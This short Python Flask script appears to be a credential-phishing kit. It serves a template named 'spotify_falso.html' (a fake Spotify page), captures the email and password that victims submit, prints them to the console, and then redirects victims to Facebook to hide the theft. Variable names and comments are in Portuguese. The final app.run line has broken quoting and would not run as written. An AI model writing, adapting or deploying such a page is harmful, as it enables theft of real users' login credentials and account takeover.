from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route("/") #pagina inicial
def pagina_inicial():
    return render_template("spotify_falso.html")

@app.route("/pega_dados", methods = ["POST"])

def pega_dados():
    email = request.form.get("email")
    senha = request.form.get("pass")

    print (f"email: {email} \n senha: {senha}")

    return redirect("https://www.facebook.com/?locale=pt_BR")


app.run(host="0.0.0.0, port = "8080"")